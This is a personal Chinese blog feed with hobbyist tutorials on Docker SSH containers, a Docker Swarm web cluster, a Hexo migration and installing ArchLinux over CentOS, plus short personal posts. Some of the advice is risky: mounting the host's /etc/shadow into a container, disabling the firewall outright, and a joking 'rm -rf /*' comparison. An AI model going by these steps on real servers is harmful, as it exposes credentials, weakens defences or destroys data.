</code></pre>
<p>此处 networks 与上面的 services 对齐，也就是顶格写，写完保存 docker-compose.yml</p>
<p>然后你把其他 Docker Compose 也这么写，就可以互相连着玩啦（不是</p>
<h2 id="使用外部的设置"><a href="#使用外部的设置" class="headerlink" title="使用外部的设置"></a>使用外部的设置</h2><p>里一套密码外一套密码总感觉不是很舒服，所以文件你也可以映射一波，一匙开两门，又快又方便（不是</p>
<h3 id="使用外部的账号密码"><a href="#使用外部的账号密码" class="headerlink" title="使用外部的账号密码"></a>使用外部的账号密码</h3><p>自己宕，自己编辑文件，在 volumes: 下加入</p>
<pre><code>    volumes:
            # ...
      - &#39;/etc/passwd:/etc/passwd:ro&#39;
      - &#39;/etc/shadow:/etc/shadow:ro&#39;
</code></pre>
<p>ro 即仅允许读，rw即允许读写，这里没啥必要给修改的就给 ro 了</p>
<p>自己开 docker-compose ，外部用密码连接，嗨，成了</p>
<h3 id="使用外部的授权密钥"><a href="#使用外部的授权密钥" class="headerlink" title="使用外部的授权密钥"></a>使用外部的授权密钥</h3><p>方法和上面一样，文件编辑加入</p>
<pre><code>    volumes:
            # ...
      - &#39;/root/.ssh/authorized_keys:/root/.ssh/authorized_keys:ro&#39;
</code></pre>
<p>重启，用密钥连接，嗨，也成了</p>
<h3 id="关闭密码登录"><a href="#关闭密码登录" class="headerlink" title="关闭密码登录"></a>关闭密码登录</h3><p>映射文件也行，自己改也行，这里就不赘述了</p>
<p><del>（皮完了）</del></p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>瞎搞</tag>
        <tag>ArchLinux</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Swarm 集群探索笔记</title>
    <url>/archives/Docker-Swarm.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学校服务器要负载均衡，根据隔壁 TARI TARI 所说，就要搞双 Nginx 冗余服务器，加上两个后端服务器用来跑 PHP 程序，同时将学校服务器的程序都跑在 Docker 上以便管理，根据 U2 推荐，使用 Swarm 进行集群搭建，一共准备六台服务器。</p>
<p>由于是第一次使用 Docker Swarm，操作起来并不熟练，如果文章有哪里出现错误和问题麻烦大佬们在评论区指出，谢谢 QvQ</p>
<p>参考资料：<a href="https://www.jianshu.com/p/df744c4e375e">https://www.jianshu.com/p/df744c4e375e</a>、<a href="https://www.jianshu.com/p/028b40ca4f2a">https://www.jianshu.com/p/028b40ca4f2a</a></p>
<p>注：本篇文章由 <a href="https://tari0510.github.io/">TARI TARI</a> 和 果果 共同创作</p>
<span id="more"></span>

<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>先别管那么多，只要你是 CentOS，防火墙先安排上，不然服务从外面（指 Docker 外面）是连不通的。（一个个端口关太鬼麻烦了，先把防火墙关了以便后续操作，这玩意坑了老久）</p>
<pre><code># 可以把防火墙关了。不过建议一个个端口关，会安全点
systemctl stop firewalld
</code></pre>
<p>如果你用 iptable 前方左转 Google</p>
<h2 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h2><ul>
<li>Docker_Master</li>
<li>CentOS7-Worker-Haproxy * 2</li>
<li>CentOS-Worker-Web * 2</li>
<li>Ubuntu-Worker-DB</li>
</ul>
<h2 id="给各台主机修改-Hostname"><a href="#给各台主机修改-Hostname" class="headerlink" title="给各台主机修改 Hostname"></a>给各台主机修改 Hostname</h2><p>为避免主机在之后的操作中难以识别的情况，先给每台主机修改 Hostname，确保主机名唯一</p>
<h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><p>参考资料：<a href="https://docs.docker.com/install/linux/docker-ce/centos/">https://docs.docker.com/install/linux/docker-ce/centos/</a></p>
<p>在 CentOS 的五台服务器上运行（嫌麻烦的用 Ansible）</p>
<pre><code>yum install -y yum-utils device-mapper-persistent-data lvm2
yum-config-manager --add-repo  https://download.docker.com/linux/centos/docker-ce.repo
yum install -y docker-ce docker-ce-cli containerd.io
</code></pre>
<p>Ubuntu 的参考这个资料 <a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">https://docs.docker.com/install/linux/docker-ce/ubuntu/</a></p>
<p>来都来了，那顺便把 docker-compose 给安排了吧</p>
<p>参考资料：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p>
<pre><code>sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.25.3/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
</code></pre>
<h2 id="对-Swarm-主机进行初始化"><a href="#对-Swarm-主机进行初始化" class="headerlink" title="对 Swarm 主机进行初始化"></a>对 Swarm 主机进行初始化</h2><p>执行命令前，给 Master 主机防火墙开启 2377（tcp）端口</p>
<p>给其余的节点主机和 Master 主机开启 7946（tcp &amp; udp）、4789（udp）端口</p>
<p>同时做作地把 80、443 端口打开以免之后出现的问题</p>
<p>参考资料：</p>
<p><a href="https://www.digitalocean.com/community/tutorials/how-to-configure-the-linux-firewall-for-docker-swarm-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-configure-the-linux-firewall-for-docker-swarm-on-ubuntu-16-04</a></p>
<p><a href="https://docs.docker.com/engine/swarm/swarm-tutorial/#open-protocols-and-ports-between-the-hosts">https://docs.docker.com/engine/swarm/swarm-tutorial/#open-protocols-and-ports-between-the-hosts</a></p>
<pre><code>firewall-cmd --zone=public --add-port=2377/tcp --permanent # 其他节点对 Master 的访问
firewall-cmd --zone=public --add-port=7946/tcp --permanent # 允许节点间的 Docker 相互通信 
firewall-cmd --zone=public --add-port=7946/udp --permanent
firewall-cmd --zone=public --add-port=4789/udp --permanent # 网络交换
firewall-cmd --reload

# 各主机可能还需要开启的端口
firewall-cmd --zone=public --add-port=80/tcp --permanent
firewall-cmd --zone=public --add-port=443/tcp --permanent
firewall-cmd --reload
</code></pre>
<p>在 Swarm 主机上，执行命令</p>
<pre><code>[root@localhost ~]# docker swarm init --advertise-addr &lt;IP Address&gt; --listen-addr &lt;IP Address&gt;:&lt;Port&gt;
Swarm initialized: current node (xxxxxxxxxxxxxx) is now a manager.

To add a worker to this swarm, run the following command:

    docker swarm join --token Balabalabalabala &lt;IP Address&gt;:&lt;Port&gt;

To add a manager to this swarm, run &#39;docker swarm join-token manager&#39; and follow the instructions.
</code></pre>
<p>然后在其他主机（节点）上运行这段命令，就是中间 docker swarm join 这行</p>
<h2 id="给节点贴标签"><a href="#给节点贴标签" class="headerlink" title="给节点贴标签"></a>给节点贴标签</h2><p>特定节点办特定事，给节点都贴上标签</p>
<pre><code>docker node update --label-add role=web Backend_1
docker node update --label-add role=web Backend_2
</code></pre>
<h2 id="部署-Portainer"><a href="#部署-Portainer" class="headerlink" title="部署 Portainer"></a>部署 Portainer</h2><p>为了方便观察和管理，这里用了 portainer</p>
<p>在 Master 主机上，放置 docker-compose.yml</p>
<pre><code>version: &quot;3&quot;

services:
  portainer:
    container_name: &quot;portainer&quot;
    image: portainer/portainer:latest
    ports:
        - &quot;9000:9000/tcp&quot;
    volumes:
        - &quot;/var/run/docker.sock:/var/run/docker.sock&quot;
    environment:
      TZ: &#39;Asia/Shanghai&#39;
    restart: always
</code></pre>
<p>运行 docker-compose up -d ，打开 <a href="http://xxx.xxx.xx.xxx:9000/">http://xxx.xxx.xx.xxx:9000</a> 进行配置</p>
<h2 id="新建一个内网使用"><a href="#新建一个内网使用" class="headerlink" title="新建一个内网使用"></a>新建一个内网使用</h2><p>docker默认网段 10.* , 然后本机如果是 10.*，则 docker 里 IP 可能会和咱内网冲突，导致无法访问到内网其他设备。 为了更方便管理，于是新建一个空闲网段</p>
<pre><code>docker network create -d overlay --subnet=192.168.0.0/24 --attachable WordPress
</code></pre>
<p>之后在docker-compose.yml 里面加入改网段就好了</p>
<h2 id="Docker-Stack-的启动"><a href="#Docker-Stack-的启动" class="headerlink" title="Docker Stack 的启动"></a>Docker Stack 的启动</h2><p>这里用到 <a href="https://github.com/metowolf">metowolf</a>/<strong><a href="https://github.com/metowolf/docker-lemp">docker-lemp</a></strong> </p>
<p>放在 Master 机器上</p>
<p>同样，我也不知道这个是不是正确的食用方法，稍微改改</p>
<p>（此处 /var/www 放在 /home 是因为机器上分区就给 /home 挂了个较大容量的分区，不知道怎么想的（小声</p>
<p>（同时 /etc/php-fpm 就直接栽到 /etc 文件夹，避免其他人上来不知道丢哪了</p>
<pre><code>version: &#39;3.2&#39;

services:
  php-fpm:
    image: metowolf/php:latest
    volumes:
      - /etc/php-fpm/php-fpm.ini:/usr/local/etc/php-fpm.ini
      - /etc/php-fpm/crontabs:/etc/crontabs
      - /home/www:/var/www
    networks:
      - WordPress
    deploy:
      mode: global
      placement:
         constraints:
            - node.labels.role==web
      restart_policy:
         condition: any
    environment:
      ENABLE_CRONTAB: &quot;true&quot;
      TZ: Asia/Shanghai

  nginx:
    image: metowolf/nginx:latest
    volumes:
      - /var/log/nginx:/var/log/nginx
      - /etc/nginx/nginx.conf:/etc/nginx/nginx.conf
      - /etc/nginx/conf.d:/etc/nginx/conf.d
      - /etc/nginx/ssl:/etc/nginx/ssl
      - /home/www:/var/www
    networks:
      - WordPress
    deploy:
      mode: global
      placement:
         constraints:
            - node.labels.role==web
      restart_policy:
         condition: any
    environment:
      ENABLE_CRONTAB: &quot;true&quot;
      TZ: Asia/Shanghai
    depends_on:
      - php-fpm

networks:
  WordPress:
    external: true
</code></pre>
<p>输入</p>
<pre><code>docker stack deploy -c docker-compose.yml Web_Backend
</code></pre>
<p>给 role 为 web 的两个节点分配任务</p>
<p>注：这么分配完了以后，由于 nginx.conf 写的是请求 php-fpm:9000 ，php-fpm 此时有两个host，所以nginx会选择性地去请求这两个其中的一个</p>
<p>注注：这里不用分配 80 和 443 端口，nginx 和 haproxy 的沟通通过 swarm 网络，将 haproxy 和 nginx 放在同一个 swarm 网络即可</p>
<p>然后到此时我感觉我 swarm 的用法是不是搞错了（小声嘀咕</p>
<h2 id="部署Haproxy"><a href="#部署Haproxy" class="headerlink" title="部署Haproxy"></a>部署Haproxy</h2><p>在 Master 主机上，放置 docker-compose.yml</p>
<pre><code>version: &quot;3.0&quot;

services:

  haproxy:
    image: haproxytech/haproxy-alpine
    ports:
      - 80:80
      - 443:443
      - 443:443/udp
    dns:
      - 127.0.0.11
    volumes:
      - /var/www:/var/www
      - /etc/haproxy:/usr/local/etc/haproxy
    networks:
      - WordPress
    deploy:
      mode: global
      placement:
         constraints:
            - node.labels.role==haproxy
      restart_policy:
         condition: any
    environment:
      ENABLE_CRONTAB: &quot;true&quot;
      TZ: Asia/Shanghai

networks:
  WordPress:
    external: true
</code></pre>
<p>haproxy 服务器上</p>
<p>注意 用证书要把两个证书合并</p>
<pre><code>-----BEGIN RSA PRIVATE KEY-----

-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----

-----END CERTIFICATE-----
</code></pre>
<p>可以在控制台运行 </p>
<pre><code>cat domain.crt domain.key | tee cert.pem
</code></pre>
<p>合并证书。</p>
<pre><code>mkdir /etc/haproxy
touch /etc/haproxy/haproxy.cfg

# /etc/haproxy/haproxy.cfg 内容如下
global
    daemon
    log          fd@2 local2
    chroot /usr/local/etc/haproxy
    tune.ssl.default-dh-param 2048
</code></pre>
<p>​<br>​    # 此处理论上不需要，因为 Docker 默认解析的主机名就是127.0.0.11，如果实在无法解析到 nginx 就加上这段吧<br>​    ########docker 主机名解析##############<br>​    resolvers docker<br>​        nameserver dns1 127.0.0.11:53<br>​        resolve_retries 3<br>​        timeout resolve 1s<br>​        timeout retry   1s<br>​        hold other      10s<br>​        hold refused    10s<br>​        hold nx         10s<br>​        hold timeout    10s<br>​        hold valid      10s<br>​        hold obsolete   10s<br>​<br>    ########default##############<br>    defaults<br>        log global<br>        mode http<br>        option httplog<br>        option dontlognull<br>        option http-server-close<br>        option forwardfor except 127.0.0.1<br>        option redispatch<br>        retries 3<br>        option redispatch<br>        maxconn 2000<br>        timeout http-request 10s<br>        timeout queue 1m<br>        timeout connect 10s<br>        timeout client 1m<br>        timeout server 1m<br>        timeout http-keep-alive 10s<br>        timeout check 10s<br>        maxconn 3000</p>
<pre><code>########frontend配置##############
frontend www
  bind *:80
  bind *:443 ssl crt /usr/local/etc/haproxy/ssl/cert.pem
  #隐藏HAProxy版本信息
  stats hide-version
  mode http
  option httpclose
  option forwardfor
  rspidel ^Server.*
  redirect scheme https if !&#123; ssl_fc &#125;
  # 利用单一连接处理多条客户端请求，从而实现性能提升
  option http-server-close
  default_backend web-backend

########backend配置##############
#指定一个名为web-backend的backend
backend web-backend
  mode http
  balance roundrobin
  cookie SERVERID insert indirect nocache
  server-template nginx 3 nginx:80 check resolvers docker inter 1000

docker pull haproxytech/haproxy-alpine
docker node update --label-add role=haproxy HaProxy_1
docker stack deploy -c docker-compose.yml HaProxy_1
</code></pre>
<h2 id="配置-Nginx-进行自我缓存（不建议）"><a href="#配置-Nginx-进行自我缓存（不建议）" class="headerlink" title="配置 Nginx 进行自我缓存（不建议）"></a>配置 Nginx 进行自我缓存（不建议）</h2><p>参考资料：<a href="https://juejin.im/post/5af38e0c518825670c45ef6e#heading-4">https://juejin.im/post/5af38e0c518825670c45ef6e</a> (作者：我是leon)</p>
<p>本来是可以用 HaProxy + Vanish 来搭建缓存服务器的，闲太麻烦就直接用 nginx 搞了（</p>
<p>在 nginx.conf 中添加以下设置</p>
<pre><code>proxy_connect_timeout 10;
proxy_read_timeout 180;
proxy_send_timeout 5;
proxy_buffer_size 16k;
proxy_buffers 4 32k;
proxy_busy_buffers_size 96k;
proxy_temp_file_write_size 96k;
proxy_temp_path /var/www/nginx/temp;
proxy_cache_path /var/www/nginx/cache levels=1:2 keys_zone=cache_one:100m inactive=1d max_size=10g;
</code></pre>
<p>（这里为了能够外部调用删除缓存写在 PHP 和 nginx 的公共目录下</p>
<h2 id="部署-Syncthing"><a href="#部署-Syncthing" class="headerlink" title="部署 Syncthing"></a>部署 Syncthing</h2><p>参考文档：<a href="https://github.com/linuxserver/docker-syncthing">https://github.com/linuxserver/docker-syncthing</a></p>
<p>注意：此处不能按照此方法用swarm分配任务，或者你在 docker-compose 单独写两个 services 也行，并且将两个 services 分别分配到不同的端口，否则连接到 Syncthing 控制台时将会产生混乱。</p>
<p>原因：这里分配完端口后，会向 swarm 网络的所有节点打开端口，然后在任意节点上尝试连接该端口就会自动转发到对应的节点上。</p>
<p>为了让两台 Web 服务器的文件同步，同时也方便查看，这里使用 syncthing</p>
<p>先给所有服务器创建 /etc/syncthing 文件夹</p>
<p>我本来是想用 swarm 派的，结果发现创建完了以后，一台服务器的syncthing GUI总是喜欢去连接一下另一台，另一台总是喜欢去连接一下这台，瞎搞</p>
<p>编辑 docker-compose.yml</p>
<pre><code>version: &quot;3&quot;
services:
  syncthing:
    image: linuxserver/syncthing
    environment:
      - PUID=1000
      - PGID=1000
      - TZ=Asia/Shanghai
      - UMASK_SET=&lt;022&gt;
    volumes:
      - /etc/syncthing:/config
      - /var/www:/sync/www
      - /etc/php-fpm:/sync/php-fpm
      - /etc/nginx:/sync/nginx
    ports:
      - 8384:8384
      - 22000:22000
      - 21027:21027/udp
    restart: always
</code></pre>
<h2 id="安装WordPress"><a href="#安装WordPress" class="headerlink" title="安装WordPress"></a>安装WordPress</h2><p>配置 nginx， 先把 原来的 https 证书搬过来，换上 </p>
<p>解析 网站根目录至 /var/www/wordpress</p>
<p>虽然物理主机上网站根目录的 /home/www 目录下， 但 docker 里的逻辑卷于 /var/www/</p>
<h2 id="配置-nfs"><a href="#配置-nfs" class="headerlink" title="配置 nfs"></a>配置 nfs</h2><p>此处配置 nfs 以便文件同步（？）</p>
<pre><code># /etc/fstab 增加
server_ip:server_dir  client_dir nfs rw  0 0
</code></pre>
<h2 id="rsync-同步"><a href="#rsync-同步" class="headerlink" title="rsync 同步"></a>rsync 同步</h2><p>（注：如果上面 Syncthing 不好用的话那还是用这个吧（</p>
<p>主服务器 以及 从服务器文件</p>
<pre><code># 详情可参考 https://tari0510.github.io/2019/07/15/ansible-shell/ rsync部分
# 从服务器已经配置好， 主服务器执行以下命令即可
sh /usr/local/inotify/rsync.sh &amp;
</code></pre>
<h2 id="数据库服务器允许新ip访问"><a href="#数据库服务器允许新ip访问" class="headerlink" title="数据库服务器允许新ip访问"></a>数据库服务器允许新ip访问</h2><p>如果是通过更换 ip 的方式迁移数据库这一步就不需要了</p>
<h2 id="时间同步"><a href="#时间同步" class="headerlink" title="时间同步"></a>时间同步</h2><p><a href="https://blog.csdn.net/a_drjiaoda/article/details/89674468">https://blog.csdn.net/a_drjiaoda/article/details/89674468</a></p>
<pre><code>yum -y install ntp ntpdate
ntpdate 0.asia.pool.ntp.org
hwclock --systohc
</code></pre>
<p>关闭所有 debug 信息</p>
<p>配置好 nginx 把域名解析到新服务器ip应该问题不大了。</p>
<h1 id="乱七八糟的问题"><a href="#乱七八糟的问题" class="headerlink" title="乱七八糟的问题"></a>乱七八糟的问题</h1><h2 id="ailed-to-chown-socket-at-step-GROUP-No-such-process"><a href="#ailed-to-chown-socket-at-step-GROUP-No-such-process" class="headerlink" title="ailed to chown socket at step GROUP: No such process"></a>ailed to chown socket at step GROUP: No such process</h2><p>解决方法：</p>
<p>添加docker用户组</p>
<pre><code>groupadd docker

# 如果出现 groupadd: cannot open /etc/group ，可能文件被加锁了，解文件锁就好了
chattr -i /etc/group
</code></pre>
<h2 id="Haproxy-dns-解析问题"><a href="#Haproxy-dns-解析问题" class="headerlink" title="Haproxy dns 解析问题"></a>Haproxy dns 解析问题</h2><p><img data-src="/images/Article/Docker-Swarm/Untitled.png" alt="Docker-Swarm/Untitled.png"></p>
<p>这里理论上是不应该出现的，出现这个问题先去看一下 开始 / 对 Swarm 主机进行初始化 这里是否配置正确</p>
<p>先进容器试试能不能 ping 通nginx，如果不能，关掉防火墙。</p>
<p>也有可能是 haproxy 版本问题，好像 ≤ 1.6 是没有 dns 解析功能的。</p>
<p>还是无法解决右转 Google</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Swarm</tag>
      </tags>
  </entry>
  <entry>
    <title>元旦快乐</title>
    <url>/archives/Happy-New-Year-2020.html</url>
    <content><![CDATA[<p>新年新气象，果果想在 2020 年更加努力上进</p>
<p>转眼间，域名好像已经换了三回了已经嘻嘻嘻</p>
<p>2019 年，果果从阿卡琳转变为了</p>
<p><del>转成啥了我也不知道</del></p>
<p>那</p>
<p>2020 年就，努力获取更多新知，变为一个更加阳光上进的孩子哦~</p>
<p>哦对了，还有一件事，</p>
<p>2020 年争取把果果的辣鸡英语给补上去（</p>
<p>顺带一提，新年新气象</p>
<p>博客域名换为 guo.moe</p>
]]></content>
      <categories>
        <category>碎碎念</category>
      </categories>
      <tags>
        <tag>日常</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 迁移笔记</title>
    <url>/archives/Hexo-migration.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于 WordPress 实在是太大太臃肿，访问时间需要 7s 左右，遂决定将程序由 WordPress 转移到 Hexo上使用，随手记录一下迁移过程。</p>
<span id="more"></span>


<h2 id="Hexo-的初始化和安装"><a href="#Hexo-的初始化和安装" class="headerlink" title="Hexo 的初始化和安装"></a>Hexo 的初始化和安装</h2><p>首先安装 npm，再运行指令安装 hexo-cli</p>
<pre><code>npm install hexo-cli -g
</code></pre>
<p>接着运行</p>
<pre><code>hexo init Guoguo
</code></pre>
<p>初始化目录，运行</p>
<pre><code>hexo server
</code></pre>
<p>打开 Hexo 服务器，输出日志如下</p>
<pre><code>INFO  Start processing
INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.
</code></pre>
<p>浏览器访问 <a href="http://localhost:4000/">localhost:4000</a> 即可看到完毕页面</p>
<h2 id="修改配置信息"><a href="#修改配置信息" class="headerlink" title="修改配置信息"></a>修改配置信息</h2><p>在 _config.yml 编辑</p>
<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>更换 <a href="https://github.com/iissnan/hexo-theme-next">hexo-theme-next</a> </p>
<pre><code>git clone https://github.com/viosey/hexo-theme-next themes/next
</code></pre>
<p>完成后在 hexo 根目录的 _config.yml 编辑 themes: next 即可</p>
<h2 id="文章的迁移"><a href="#文章的迁移" class="headerlink" title="文章的迁移"></a>文章的迁移</h2><blockquote>
<p>此处参照 <a href="https://hexo.io/zh-cn/docs/migration.html">https://hexo.io/zh-cn/docs/migration.html</a> Wordpress 详细步骤</p>
</blockquote>
<h2 id="Disqus-的配置"><a href="#Disqus-的配置" class="headerlink" title="Disqus 的配置"></a>Disqus 的配置</h2><p>修改 next 主题的配置文件 /themes/next/_config.yml 的 api，但出现</p>
<blockquote>
<p>该 Thread 并没有初始化，是否 切换到完整 Disqus 模式 进行初始化？</p>
</blockquote>
<p>~~~尚未解决。~~~</p>
<p>部署完成以后点击切换到完整版解决。</p>
<h2 id="添加自定义链接"><a href="#添加自定义链接" class="headerlink" title="添加自定义链接"></a>添加自定义链接</h2><p>在 next 主题的 menu 加入</p>
<pre><code>友情链接: /links/ || user
</code></pre>
<p>（不知道使用方法有没有错误</p>
<h2 id="部署到服务器"><a href="#部署到服务器" class="headerlink" title="部署到服务器"></a>部署到服务器</h2><p>输入</p>
<pre><code>hexo g
</code></pre>
<p>生成乱七八糟的文件，将 Public 内文件丢上服务器</p>
<h2 id="提升幸福感"><a href="#提升幸福感" class="headerlink" title="提升幸福感"></a>提升幸福感</h2><p>使用 Service Worker，<a href="https://www.liaofuzhan.com/posts/1599400735.html">参考资料</a></p>
<h2 id="添加底部版权信息"><a href="#添加底部版权信息" class="headerlink" title="添加底部版权信息"></a>添加底部版权信息</h2><p>参考资料： <a href="https://arcecho.github.io/2017/04/08/Hexo-Next%E4%B8%8B%E6%B7%BB%E5%8A%A0%E7%89%88%E6%9D%83%E5%A3%B0%E6%98%8E%E6%A8%A1%E5%9D%97/">Hexo Next下添加版权声明模块 | 每天进补一点点！</a> </p>
<p>小改动：</p>
<p>css 插入至 source/css/_common/components/post/post.styl</p>
<p>HTML 内容插入至 END POST BODY 上面 div 标签的前面，将 </p>
<pre><code>url_for(page.path)
</code></pre>
<p>修改为</p>
<pre><code>post.permalink
</code></pre>
<p>🉑</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>给服务器安装 ArchLinux</title>
    <url>/archives/Install-ArchLinux-For-Server.html</url>
    <content><![CDATA[<p>注：此处安装不太适合给没有 VNC 管理权限的服务器使用，装炸了难以排查问题</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学校的服务器是 CentOS ，分区是在 /dev/sda2 上又开了一层 lvm 分区，这种分区方式令我感觉十分不舒服，其中有个原因是根目录空间不够，但 /home 分区的空间又大得一坨，遂尝试删除并合并分区。swapoff 并删除+合并以后没问题，但保险起见将备份文件移至我的 NUC 上，改 /etc/fstab ，然后一重启，打不开机子，上面好像写着无法读取 /dev/centos/swap 分区。（不过我也不是很清楚到底哪里）正当我庆幸自己聪明机智有备份的时候，翻开 NUC 一看，里面几个大字写着</p>
<span id="more"></span>

<p>Backup.tar.gz**.part**</p>
<p>然后稍感事情好像不太对，最后费了一天时间来提里面的备份，好不容易提出来。</p>
<p>（小声BB一句，CentOS 的救援模式似乎没办法联网，所以都是情急下xjb弄的</p>
<p>（极限操作，开启 CentOS 光盘中的救援模式，挂载系统盘，提取备份文件至 /tmp ，删除分区，重新分区，分一个2G的盘给备份文件，剩下的直接开新分区）</p>
<p>Q: 系统都坏成这样了，为什么不直接装 ArchLinux？</p>
<p><del>因为 VMware vSphere 似乎无法挂载自己的 ISO 文件，得主机有这个 iso 文件才能用，</del></p>
<p>因为学生没有权限挂载自己的 ISO 文件</p>
<p>而之前还挂着 CentOS 的安装盘，所以就曲线救国，先装一遍 CentOS 再安装 ArchLinux。</p>
<h1 id="正片"><a href="#正片" class="headerlink" title="正片"></a>正片</h1><blockquote>
<p>参考资料：<a href="https://wiki.archlinux.org/index.php/Install_Arch_Linux_from_existing_Linux_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8_Bootstrap_%E9%95%9C%E5%83%8F%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89">https://wiki.archlinux.org/index.php/Install_Arch_Linux_from_existing_Linux</a></p>
</blockquote>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>直接前往镜像站<a href="http://mirrors.163.com/archlinux/iso/2019.12.01/">（163）</a>wget一手 archlinux-bootstrap-*-x86.64.tar.gz 到 /tmp 目录，解压至 /tmp</p>
<h2 id="修改-mirrorlist"><a href="#修改-mirrorlist" class="headerlink" title="修改 mirrorlist"></a>修改 mirrorlist</h2><p>找到 China 的 163 源，取消注释</p>
<h2 id="放置解析"><a href="#放置解析" class="headerlink" title="放置解析"></a>放置解析</h2><p>为了防止等会装的时候删文件解析出问题，所以先</p>
<pre><code>rm -f /tmp/root.x86_64/etc/resolv.conf
cp /etc/resolv.conf /tmp/root.x86_64/etc/
</code></pre>
<h2 id="进入-chroot"><a href="#进入-chroot" class="headerlink" title="进入 chroot"></a>进入 chroot</h2><p>记得确认 Bash 版本是否 ≥ 4</p>
<pre><code>/tmp/root.x86_64/bin/arch-chroot /tmp/root.x86_64/
</code></pre>
<p>注：我在此处执行命令的时候出现了这个提示</p>
<pre><code>unshare: unrecognized option &#39;--fork&#39;
</code></pre>
<p>解决方法很简单，更新一下 util-linux 就行了</p>
<pre><code>yum update -y util-linux
</code></pre>
<h2 id="初始化并验证-pacman-密匙环"><a href="#初始化并验证-pacman-密匙环" class="headerlink" title="初始化并验证 pacman 密匙环"></a>初始化并验证 pacman 密匙环</h2><pre><code>pacman-key --init
pacman-key --populate archlinux
</code></pre>
<p>新安装的 CentOS 跑这个特别的慢，按照官方提示，你可以先安装一个 rng-tools</p>
<pre><code>yum install -y rng-tools
</code></pre>
<h2 id="挂载目录"><a href="#挂载目录" class="headerlink" title="挂载目录"></a>挂载目录</h2><p>将 /dev/sda2 挂载到 /mnt ，将 /dev/sda1 挂载到 /mnt/boot</p>
<pre><code>mount /dev/sda2 /mnt
mount /dev/sda1 /mnt/boot
</code></pre>
<p>删除外围文件夹，将除了 /proc /srv /sys /dev /opt /run /tmp（也就是没法删的）的文件夹都删了</p>
<p>感觉跟 rm -rf /* 差不多（</p>
<p><strong>注意：请不要把 /tmp 文件夹给删了，不然这个 chroot 就直接炸掉</strong></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>接下来的操作就和 <a href="https://guo.moe/archives/ArchLinux-Install-Note.html?_sw-precache=27ead53f1532b28f1de70419a15cb58f">ArchLinux 安装笔记</a> 所提到的差不多了，依次进行笔记所提到的开始安装和基础设置。但这个 VMware vSphere 好像默认是传统引导方式，所以中间的grub安装修改一下 </p>
<pre><code>pacman -S grub
grub-install /dev/sda
grub-mkconfig -o /boot/grub/grub.cfg
</code></pre>
<p>就可以了</p>
<h3 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h3><p>注意，这个时候重启是没有网络的，所以要先提前配置好 sshd 和 systemd-networkd ，否则重启以后还要进 vnc 会有点麻烦，编译 /etc/systemd/network/20-wired.network </p>
<pre><code>[Match]
Name=ens32 # 网卡名字

[Network]
Address=172.16.5.233/24 # IP 地址
Gateway=172.16.5.1
DNS=172.16.5.1
</code></pre>
<p>并执行</p>
<pre><code>systemctl enable systemd-networkd
systemctl enable sshd
</code></pre>
<p>然后就可以重启了，尝试外部能否连接 ssh？</p>
<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>正常来说，这个时候重启就基本能够出现高贵的 ArchLinux 字样了，</p>
<p><del>虽然过程很艰苦，但还是开心的</del></p>
<p>开心个屁啊，备份文件提不出来那几次差点被急哭了，还好有 U2 在一旁帮忙</p>
]]></content>
      <categories>
        <category>技术篇</category>
      </categories>
      <tags>
        <tag>瞎搞</tag>
        <tag>ArchLinux</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>小米 10 Pro 一周体验</title>
    <url>/archives/Mi-10-Pro-Experience.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前用的 iPhone 6S Plus 有点卡顿（屁都不卡，其实就是想换），正好最近 618，MIUI 好像也被捧得很高，所以就寻思着换台手机提升一下自己的体验好了。</p>
<span id="more"></span>

<h1 id="正戏"><a href="#正戏" class="headerlink" title="正戏"></a>正戏</h1><h2 id="购买"><a href="#购买" class="headerlink" title="购买"></a>购买</h2><p>这次 618 活动买小米 10 Pro有许多人选择星巴克券+北京券去京东买，但很手残的是，那几天没咋关注，天天就只记得叠蛋糕，导致没发现这事，等发现的时候车已经走了，然后就上了拼多多百亿补贴的车。12+256 的价格最终被压到 4388，我觉得还不错。PDD 牛皮！</p>
<p><img data-src="/images/Article/Mi-10-Pro-experience/Untitled.png" alt="/images/Article/Mi-10-Pro-experience/Untitled.png"></p>
<p>在拼多多购买后 2 天发货，第三天收到商品，收到前发送 IMEI 给小米商城客服查询未激活，安心开箱。</p>
<p>（那 PDD 是真滴牛皮）</p>
